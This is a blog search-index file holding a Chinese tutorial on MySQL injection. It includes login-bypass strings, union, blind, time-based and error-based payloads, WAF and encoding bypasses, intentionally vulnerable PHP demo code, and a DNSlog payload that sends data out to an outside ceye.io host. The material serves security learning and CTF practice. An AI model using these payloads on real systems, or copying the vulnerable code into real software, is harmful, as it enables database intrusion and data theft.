<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql注入总结</title>
      <link href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/"/>
      <url>/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p><strong>SQL注入总结</strong></p><p>进行总结，详细实现过程细节可能不会写出来~</p><p>所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同</p><p><strong>0x00 SQL注入原理：</strong></p><p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。</p><p>可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等</p><p>注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。</p><p>注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog</p><p><strong>0x01 SQL注意一般方法：</strong></p><p>正常查询语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot; select username,age from userinfo where id=&#x27;$_GET[&#x27;id&#x27;]&#x27; &quot;);</span><br></pre></td></tr></table></figure><p><strong>万能密码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">&#x27; or 1=1#　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or 1=1#&#x27;</span><br><span class="line">&#x27;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27;=0#</span><br></pre></td></tr></table></figure><p><strong>使用union进行联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,(select database()) #</span><br><span class="line">xx&#x27; union select (select database()),2 or &#x27;　　　　　　//这里如果把查询语句放到2的位置上，因为or的关系会不能显示正常查询的内容 </span><br></pre></td></tr></table></figure><p>这个结果是在输出列为我们可控的 database()和’2’这2个值，那么如果登录页面的验证逻辑是如下形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query(&quot; select username,password from userinfo where id=&#x27;$_GET[&#x27;username&#x27;]&#x27; &quot;);</span><br><span class="line">if(md5($_GET[&#x27;password&#x27;]) === $result[&#x27;password&#x27;])&#123;</span><br><span class="line">　　echo &quot;登录成功&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　echo &quot;登录失败&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们便可以通过下来方法构造来绕过用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账户：xx&#x27; union select 1,&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27; #　　　　　　//c81e728d9d4c2f636f067f89cc14862c是2的md5值</span><br><span class="line">密码：2</span><br></pre></td></tr></table></figure><p><strong>使用bool回显判断注入</strong></p><p>substr(str,start,long)</p><p>　　str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度</p><p>if(exp1,exp2,exp3)</p><p>　　如果满足exp1,那么执行exp2,否则执行exp3</p><p>注入语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),1,1)=&#x27;c&#x27;),1,0) #　　　　//判断数据库第一个字符是否为c</span><br></pre></td></tr></table></figure><p>那么查询第二个字符可以用下列方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),1,2)=&#x27;ct&#x27;),1,0) #　　　　</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),2,1)=&#x27;t&#x27;),1,0) #　　　　</span><br></pre></td></tr></table></figure><p>假设 , (逗号)被过滤了，可以用如下方式处理</p><p>　if(exp1, exp2, exp3) =&gt; case when exp1 then exp2 else exp3 end</p><p>　substr(exp1, 1, 1) =&gt; substr(exp1) from 1 for 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or case when (substr((select database()) from 1 for 1)=&#x27;c&#x27;) then 1 else 0 end #</span><br></pre></td></tr></table></figure><p>假设substr被过滤了，可以用如下方式处理</p><p>LOCATE(substr,str,pos)</p><p>　　返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0</p><p>　　ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个binary即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((locate(binary&#x27;c&#x27;,(select database()),1)=1),1,0) #</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((locate(binary&#x27;t&#x27;,(select database()),1)=2),1,0) #</span><br></pre></td></tr></table></figure><p><strong>使用延迟注入</strong></p><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功</p><p>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显</p><p>还是利用if来判断结果正确与否，只是返回值用延时来代替1</p><p>方法：sleep，benchmark， 笛卡尔积等（其他的我还是太菜不太会用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于sleep的延迟 xx&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span><br><span class="line">基于笛卡尔乘积运算时间造成的时间延迟</span><br><span class="line">xx&#x27; or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # 基于benchmark的延迟 xx&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;a&#x27;))),1) #--大概会用2S时间</span><br></pre></td></tr></table></figure><p>benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟</p><p><strong>使用DNSlog进行数据回显</strong></p><p>原理网上很多文章都有，这里稍微总结下使用技巧</p><p>load_file()</p><p>　　读取文件并返回文件内容为字符串。</p><p>这里先在ceye.io上注册个账号看看自己的子域名就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;or if(length((select database()))&gt;1,(select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.你账号的子域名.ceye.io\\a&#x27;))),1) # </span><br></pre></td></tr></table></figure><p>只要能够写select的地方，并且能够调用load_file函数就能执行</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109122423553-1822791446.png"><img src="%7Bfilename%7D/1419450-20190109122423553-1822791446.png" alt="img"></a></p><p><strong>报错注入</strong></p><p>报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容</p><p>报错注入函数很多，这里就介绍两种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; and (updatexml(1,concat(1,(select database()),1),1))　　　　# 用 or连接也行</span><br><span class="line">xx&#x27; and (extractvalue(1,concat(1,(select database()),1)))　　　# 用 or连接也行</span><br></pre></td></tr></table></figure><p><strong>0x02 SQL注入的技巧:</strong></p><p>该小结的例句还是以0x01节的原始查询语句相同</p><p><strong>mid切割字符串</strong></p><p>常常会出现回显字符串长度的限制，我们可以用mid来切割</p><p>mid(str, start[, length])</p><p>　　str为待切割的字符串，start为从第几个位置开始,length(没有则返回后面所有)为切割长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#x27; union select (mid((select database()),1,2))</span><br></pre></td></tr></table></figure><p>在写到这时，发现mid和substr作用很像，自己测试也一下可以在有时”代替”substr进行bool型判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if(mid((select database()),2,1)=&#x27;t&#x27;,1,0) #</span><br></pre></td></tr></table></figure><p><strong>hex编码与字符串</strong></p><p>字符串在某种意义上是和它的hex值等价的，举个栗子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = &#x27;1&#x27;    &lt;===&gt;  select * from admin where id = 0x31</span><br></pre></td></tr></table></figure><p>在”好不容易”逃逸第一个 ‘(单引号)后，后面的有会有查询关键字需要单引号会破坏sql语句结构时候用</p><p>或者一些关键字被过滤了，但是又会出现在查询里面</p><p>能够被hex编码的内容必须是字符串，即’(被单引号括起来)’的内容。关键字是不能被编码的</p><p><strong>利用group_concat连接多行</strong></p><p> 有些时候返回值只能显示一行内容，这时候有2种办法</p><p>用limit一行一行的运行</p><p>用group_concat将内容连在一行一并输出</p><p>可见group_concat比limit要方便一点，使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,(select group_concat(name，id) from admin) #</span><br></pre></td></tr></table></figure><p>它输出格式是每个元组用逗号隔开的(我这里email是我在做其他测试时候瞎填的)</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109133111315-1086071877.png"><img src="%7Bfilename%7D/1419450-20190109133111315-1086071877.png" alt="img"></a></p><p><strong>利用like和regexp来进行匹配</strong></p><p> like后面能进行模糊匹配，关键字内容为</p><p>%　　　　=&gt; 匹配任意个字符串</p><p>_　　　　 =&gt; 匹配一个字符</p><p>但是存在前提，被匹配的字符可以是select查询语句，可以是该表内的字段，可以是返回为字符串的函数比如database()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or database() like &#x27;c%&#x27; #</span><br><span class="line">xx&#x27; or database() like &#x27;ct_&#x27; #xx&#x27; or name like &#x27;siji%&#x27; #xx&#x27; or (select dd from uesrinfo) like &#x27;h%&#x27; #</span><br></pre></td></tr></table></figure><p>在某种程度上regexp和like的效果差不多，但是它是支持正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or database() like &#x27;^c.f$&#x27; #</span><br></pre></td></tr></table></figure><p> 但是这样不方便，测试一下后发现可以用这个方法逐个匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or name regexp &#x27;^s$*&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or name regexp &#x27;^si$*&#x27;</span><br></pre></td></tr></table></figure><p><strong>mysql的GBK导致的宽字节注入</strong></p><p>因为gbk是2个字节为一个编码，而我们如果把字符用url编码后%xx是一个字节，%xx%xx才表示一个gbk编码。在post或者get传参的时候会自动进行一次url解码</p><p>常见的过滤为addslashes(str)会把 ‘ 转义为 &#39; 导致注入失败</p><p>那么在宽字节注入的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,database() # 　　　　//是会被拦截的</span><br><span class="line">xx%df&#x27; union select 1,2,datbase() #　　　 //款字节注入，会把\&#x27;组合在一起</span><br></pre></td></tr></table></figure><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109144139622-1954433630.png"><img src="%7Bfilename%7D/1419450-20190109144139622-1954433630.png" alt="img"></a></p><p>这个是还没进数据库前的样子，因为web页面解析用的gbk所以达到了这个效果。而实际进入数据库是这样的，看看日志(该文件编码是utf-8)</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109144949627-1705224551.png"><img src="%7Bfilename%7D/1419450-20190109144949627-1705224551.png" alt="img"></a></p><p>将文件用gbk编码形式打开</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109145501432-326465736.png"><img src="%7Bfilename%7D/1419450-20190109145501432-326465736.png" alt="img"></a></p><p>无论设置没有设置gbk传进去的字符样子没啥变化，但是内部处理机制发生了变化。总而言之gbk把 β\ 当成一个字符，而不是gbk模式下 β \ 是被当成2个字符</p><p><strong>mysql关于utf-8编码问题</strong></p><p>如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的</p><p>是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式</p><p>utf8_unicode_ci</p><p>该模式会把特殊字母转换成2个正规英文，例如ß=ss</p><p>utf8_general_ci</p><p>该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U</p><p>比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql1 = select * from admin where id = &#x27;xx&#x27; union select 1,2,database() #</span><br><span class="line">$sql2 = select * from admin where id = &#x27;xx&#x27; uniÖn select 1,2,database() #</span><br><span class="line">if(preg_match(&#x27;/union/i&#x27;,$sql1) &gt; 0)&#123;</span><br><span class="line">　　echo &#x27;waf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　执行sql语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/union/i&#x27;,$sql2) &gt; 0)&#123;</span><br><span class="line">　　echo &#x27;waf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　执行sql语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>0xff结语：</strong></p><p>这章就先把基础的和ctf中遇到的姿势写了写，sql注入还会写关于二次注入，简要的python脚本心得和点bypass总结</p><p>下篇<a href="https://www.cnblogs.com/sijidou/p/10244738.html">sql注入总结(二)</a></p><p> <strong>0x00前言:</strong></p><p>继上篇的内容，这章总结下二次注入，python脚本，bypass</p><p>上篇<a href="https://www.cnblogs.com/sijidou/p/10243458.html">sql注入总结(一)–2018自我整理</a></p><p><strong>0x01二次注入:</strong></p><p>二次注入的原理是在把非法代码添加进数据库里面存储了，因为 &#39; 这种转义不会把(反斜杠)代入到数据库中存储，然后在其他地方调用了这个非法代码并且拼接到sql语句中了</p><p>简而言之</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">非法代码             ==存入==&gt;  数据库　　　　　　　　#非法代码  \&#x27; 这种转义的只会把 &#x27; 存入数据库</span><br><span class="line"></span><br><span class="line">数据库中的非法代码字段 ==取出==&gt; 后台语言中的变量中</span><br><span class="line"></span><br><span class="line">后台语言变量的非法代码 ==代入==&gt; sql查询语句中进行拼接</span><br></pre></td></tr></table></figure><p>这里我手写了个建议的二次注入原理代码</p><p>插入数据页面代码input.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br><span class="line">    mysql_select_db(&quot;test&quot;, $conn);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        用户id:&lt;input type = &quot;text&quot; name=&quot;id&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        用户名：&lt;input type = &quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        密码：&lt;input type = &quot;text&quot; name=&quot;password&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        邮箱：&lt;input type =&quot;text&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $id = @addslashes($_POST[&#x27;id&#x27;]);</span><br><span class="line">    $username = @addslashes($_POST[&#x27;username&#x27;]);</span><br><span class="line">    $password = @addslashes($_POST[&#x27;password&#x27;]);</span><br><span class="line">    $email = @addslashes($_POST[&#x27;email&#x27;]);</span><br><span class="line">    $sql = &quot;insert into userinfo values(&#x27;$id&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;,&#x27;$email&#x27;)&quot;;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查询数据页面代码out.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $uid = $_GET[&#x27;uid&#x27;];</span><br><span class="line">    $conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br><span class="line">    mysql_select_db(&quot;test&quot;, $conn);</span><br><span class="line">    $sql = &quot;SELECT * FROM userinfo where id=&#x27;$uid&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $ans = mysql_fetch_array($result);</span><br><span class="line">    $username = $ans[&#x27;username&#x27;];</span><br><span class="line">    $sql2 = &quot;SELECT * FROM userinfo where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql2);</span><br><span class="line">    $ans = mysql_fetch_array($result);</span><br><span class="line">    var_dump($ans);</span><br></pre></td></tr></table></figure><p>首先查看数据库里面的数据，就2个</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109153334333-1741182970.png"><img src="1419450-20190109153334333-1741182970.png" alt="img"></a></p><p>在input.php页面添加信息，用户名就是我们的注入代码</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109153439917-1960234704.png"><img src="%7Bfilename%7D/1419450-20190109153439917-1960234704.png" alt="img"></a></p><p>再看数据库，发现 \ 这个符号确实没有被代入数据库中存储</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109153743651-359479936.png"><img src="1419450-20190109153743651-359479936.png" alt="img"></a></p><p>在out.php中传入get参数3，发现执行union联合查询输出的1,2,database(),4。这里我数据库名字叫做’test’</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109154139075-316407580.png"><img src="1419450-20190109154139075-316407580.png" alt="img"></a></p><p>至此二次查询的原理就是这样，在ctf中曾做过一道二次查询的题目</p><p>题目攻击方式大致是通过注册，如果执行成功主页和执行失败的主页是有区别的，然后写python脚本盲注得出flag</p><p>其中用户名的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or if((length((select database()))&gt;0),1,0) or&#x27;</span><br><span class="line"></span><br><span class="line">代入数据库前完整代码可能是</span><br><span class="line">insert into user values(&#x27;id&#x27;,&#x27;\&#x27;or if((length((select database()))&gt;0),1,0) or\&#x27;&#x27;,&#x27;password&#x27;)</span><br><span class="line"></span><br><span class="line">取出数据时候的情况即</span><br><span class="line">$username = $ans[&#x27;username&#x27;]　　　　#$username = &#x27;or if((length((select database()))&gt;0),1,0) or&#x27;</span><br><span class="line"></span><br><span class="line">第二次拼接的情况</span><br><span class="line">mysql_query(&quot;select * from user where username = &#x27;&#x27;or if((length((select database()))&gt;0),1,0) or&#x27;&#x27; &quot;)</span><br></pre></td></tr></table></figure><p> 那么还存在一种情况就是拼接的字段是id，但是id我们不可控,比如（当然该条件有个限制即 ‘(单引号) 没有被转义!!!!!!）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;insert into userinfo values(&#x27;4&#x27;,&#x27;$username&#x27;, &#x27;$password&#x27;, &#x27;$email&#x27;)&quot;);</span><br><span class="line"></span><br><span class="line">查询语句根据username取出数据库内容，再把id拼接到查询语句</span><br><span class="line">$id = $ans[&#x27;Id&#x27;];</span><br><span class="line">mysql_query(&quot;select * from userinfo where id = $id &quot;)</span><br></pre></td></tr></table></figure><p>这时候我们可以控制$email参数，做到写入多组记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha&#x27;,&#x27;haha@qq.com</span><br></pre></td></tr></table></figure><p>可以看到一口气注册了2个账号，而5号账号是我可控的（我将源代码中input.php的addslashes给去除了）</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109160153899-695737626.png"><img src="1419450-20190109160153899-695737626.png" alt="img"></a></p><p>类比下，如果只有中间的password我们可控的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password&#x27;,&#x27;si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha&#x27;,&#x27;haha@qq.com&#x27;),(&#x27;6&#x27;,&#x27;myname&#x27;,&#x27;password2　　　　#这样会出现3组数据</span><br><span class="line">或者</span><br><span class="line">password&#x27;,&#x27;si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha　 　　　　　　　　　　　　　　　　　　　　　　　　　　　#这样就出现2组数据</span><br></pre></td></tr></table></figure><p><strong>0x02bypass:</strong></p><p>写bypass总有些心虚，因为自己知道的不多23333</p><p><strong>双写绕过清空</strong></p><p>有些waf是用preg_match将非法字符替换为空，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = preg_match(&quot;/union|select/i&quot;, &quot;&quot;, $sql)</span><br></pre></td></tr></table></figure><p>它不是把你数据直接挡掉报错，而是处理后仍然通行，在有/xx/i忽视大小写可以双写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selselectect  ==去掉其中的select==&gt; sel去掉的ect ==&gt; select</span><br></pre></td></tr></table></figure><p><strong>url和base64编码</strong></p><p>其实这不怎么算bypass，但是有些书上也这么讲，这里稍微写下</p><p>在有些代码中会对参数进行base64解码，url解码等操作，如果这些操作在转义或者waf之后的话，就会逃过过滤达到注入的效果</p><p>如果在处理之前的话就没有作用啦</p><p><strong>内敛注释</strong></p><p>在有些在后台代码上对关键字并未过滤，但是之后会经过安全软件，再存入数据库，有时候内敛注释可以骗过安全软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/　　　　#其中的union是会执行的</span><br></pre></td></tr></table></figure><p><strong>空格被过滤</strong></p><p>有2中办法，通过括号或者/**/来完成不需要空格也能执行的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;/**/union/**/select/**/1,2,3,4/**/#</span><br><span class="line">xx&#x27;union select(1),(2),(3)#空格有个问题，它是将参数括起来来绕过空格，但是如果2个关键字比如这里的union和select没法一个当另一个的参数，于是有时候这个方法也不灵</span><br></pre></td></tr></table></figure><p><strong>单引号的过滤</strong></p><p>虽然sql注入第一步就是将单引号逃逸出来，但是有时候单引号逃逸了后会在单引号前面加些奇怪的东西，比如GBK宽字节注入</p><p>这时候可以hex编码</p><p>‘内容’ 等价于 0x内容的十六进制编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27;   = 0x616263</span><br></pre></td></tr></table></figure><p><strong>特别的sprintf</strong></p><p>有些时候会用sprintf来包裹sql语句，但是sprintf这个函数有个问题在，非正常的地方输入%,会提示warning（如果没有用@禁止的话）</p><p>利用方法，用 %1$’ 代替 ‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  ==&gt; %1$&#x27;</span><br><span class="line">%1$&#x27;or 1=1 #</span><br></pre></td></tr></table></figure><p><strong>关键字的绕过</strong></p><p>在总结一中归纳了 ,(逗号) 被过滤的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(exp1, exp2, exp3)   =&gt;  case when exp1 then exp2 else exp3 end</span><br><span class="line"></span><br><span class="line">substr(exp1, 1, 1)     =&gt; substr(exp1) from 1 for 1</span><br></pre></td></tr></table></figure><p>如果 and 和 or 被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and   =&gt; &amp;&amp;</span><br><span class="line">or    =&gt; ||</span><br></pre></td></tr></table></figure><p>如果where被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=&#x27;1&#x27;   =&gt;  order by id having id=&#x27;1&#x27; </span><br></pre></td></tr></table></figure><p>如果’=’被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=&#x27;    =&gt;  &#x27;&lt;&gt;&#x27;</span><br></pre></td></tr></table></figure><p>如果’&lt;’,’&gt;’,’=’被过滤了，但是要设置范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1   ==&gt; id between 1 and 1</span><br></pre></td></tr></table></figure><p><strong>关于json的编码</strong></p><p>之前做18年HCTF的时候，一道简单的代码审计题，会将cookie中的值代入waf中，然后再进入数据库</p><p>关键点在于在经过waf后，它会进行json的解码。</p><p>在json解码中有个Unicode的编码问题，有兴趣大家可以百度下，我这里直接写利用方法</p><p>json编码可以用\u00xx (xx为16进制ascii码)来用Unicode来编码对应字符。如果waf在json_decode之前，那么可以通过这个方法绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\u0075&#x27;  ==&gt;  &#x27;u&#x27;</span><br></pre></td></tr></table></figure><p><strong>0x03python脚本</strong></p><p>sqlmap十分强大，但是就算是level5，有时候也会被特别的waf给拦截，调用它的bypass模块又记不住。这里就总结下自己怎么写盲注python脚本</p><figure class="highlight 